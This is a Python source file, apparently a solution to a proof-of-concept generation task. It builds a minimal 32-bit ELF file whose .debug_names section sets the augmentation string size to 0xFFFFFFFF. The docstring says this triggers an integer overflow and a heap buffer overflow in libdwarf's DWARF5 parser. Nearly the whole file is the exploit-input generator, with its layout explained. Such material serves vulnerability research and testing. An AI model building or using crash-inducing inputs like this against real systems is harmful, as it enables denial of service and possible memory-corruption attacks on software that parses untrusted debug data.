import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        This PoC constructs a minimal 32-bit ELF file with a specially crafted
        .debug_names section. The vulnerability in libdwarf's DWARF5 parser
        is a heap buffer overflow triggered by an integer overflow.

        The .debug_names header contains a field `augmentation_string_size`.
        By setting this 32-bit field to its maximum value (0xFFFFFFFF), we
        trigger an integer overflow in the vulnerable code when it calculates
        the buffer size to allocate (`size + 1`). This results in a very small
        buffer being allocated on the heap. Subsequently, the code attempts to
        copy 0xFFFFFFFF bytes into this tiny buffer, causing a massive heap
        buffer overflow and crashing the program.

        The ELF file is structured as follows:
        1. A minimal 32-bit ELF header.
        2. A section header table with three entries: NULL, .shstrtab, and .debug_names.
        3. The section name string table (.shstrtab).
        4. The malicious .debug_names section containing the trigger value.
        """
        endian = '<'

        # 1. ELF Header (32-bit)
        e_ident = b'\x7fELF\x01\x01\x01' + b'\x00' * 9
        ehdr_format = endian + 'HHIIIIIHHHHHH'
        ehdr_size = 52
        shent_size = 40
        shnum = 3  # NULL, .shstrtab, .debug_names
        shoff = ehdr_size
        shstrndx = 1  # .shstrtab is at index 1

        elf_header = struct.pack(
            ehdr_format,
            1,          # e_type = ET_REL
            3,          # e_machine = EM_386
            1,          # e_version = EV_CURRENT
            0,          # e_entry
            0,          # e_phoff
            shoff,      # e_shoff
            0,          # e_flags
            ehdr_size,  # e_ehsize
            0,          # e_phentsize
            0,          # e_phnum
            shent_size, # e_shentsize
            shnum,      # e_shnum
            shstrndx    # e_shstrndx
        )
        elf_header = e_ident + elf_header

        # 2. Section Content
        shstrtab_content = b'\x00.shstrtab\x00.debug_names\x00'

        # Craft the malicious .debug_names section header
        # The header structure read by the vulnerable libdwarf version is:
        # - unit_length (4B), version (2B), then 12 4-byte fields.
        # Total size = 4 + 2 + 12 * 4 = 54 bytes.
        # unit_length = size of content after unit_length field = 50.
        debug_names_header_content_size = 2 + 12 * 4

        debug_names_content = b''
        debug_names_content += struct.pack(endian + 'I', debug_names_header_content_size)
        debug_names_content += struct.pack(endian + 'H', 5)  # DWARF Version 5
        # Zero out the 11 fields before the augmentation string size.
        # This includes setting bucket_count to 0, which simplifies parsing.
        debug_names_content += b'\x00' * (11 * 4)
        # The trigger value for the integer overflow
        debug_names_content += struct.pack(endian + 'I', 0xFFFFFFFF)

        # 3. Calculate File Offsets for Section Content
        shstrtab_offset = shoff + shnum * shent_size
        debug_names_offset = shstrtab_offset + len(shstrtab_content)

        # 4. Section Header Table
        sht = b''
        shdr_format = endian + 'IIIIIIIIII'

        # Entry 0: NULL section header
        sht += b'\x00' * shent_size

        # Entry 1: .shstrtab section header
        sht += struct.pack(
            shdr_format,
            1,                      # sh_name (offset of ".shstrtab" in shstrtab)
            3,                      # sh_type = SHT_STRTAB
            0,                      # sh_flags
            0,                      # sh_addr
            shstrtab_offset,        # sh_offset
            len(shstrtab_content),  # sh_size
            0, 0, 1, 0              # sh_link, sh_info, sh_addralign, sh_entsize
        )

        # Entry 2: .debug_names section header
        sht += struct.pack(
            shdr_format,
            11,                     # sh_name (offset of ".debug_names" in shstrtab)
            1,                      # sh_type = SHT_PROGBITS
            0,                      # sh_flags
            0,                      # sh_addr
            debug_names_offset,     # sh_offset
            len(debug_names_content), # sh_size
            0, 0, 1, 0              # sh_link, sh_info, sh_addralign, sh_entsize
        )

        # 5. Assemble the final PoC file
        poc = elf_header + sht + shstrtab_content + debug_names_content
        return poc